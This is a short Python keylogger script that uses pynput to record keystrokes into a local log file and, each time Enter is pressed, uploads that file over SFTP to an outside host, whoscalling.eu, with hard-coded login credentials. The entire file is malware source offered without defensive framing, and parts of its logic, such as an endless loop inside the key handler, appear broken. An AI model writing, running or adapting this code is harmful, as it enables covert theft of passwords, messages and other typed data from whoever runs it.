import os
import paramiko
from pynput.keyboard import Listener



def osDetect():
    if os.name == 'nt':

        OS = '\\'
        return OS
    elif os.name == 'posix':

        OS = '/'
        return OS


def outreach():
    ssh = paramiko.SSHClient()
    ssh.load_host_keys(os.path.expanduser(os.path.join("~", ".ssh", "known_hosts")))
    ssh.connect('whoscalling.eu', username='log', password='logpass13')
    sftp = ssh.open_sftp()
    sftp.put(f'{os.getcwd()}{osDetect()}log.txt', 'log.txt')
    sftp.close()
    ssh.close()


def keylogger(Listener):

    def on_press(key):
        while True:
            file = open('log.txt', 'a', encoding='utf-8')
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write(" ")
            elif k.find("enter") > 0:
                file.write("\n")
                outreach()
            elif k.find("Key") == -1:
                file.write(k)
            file.close()
            
    Listener = Listener(on_press=on_press)
    Listener.join()




if __name__ == '__main__':

    keylogger(Listener)
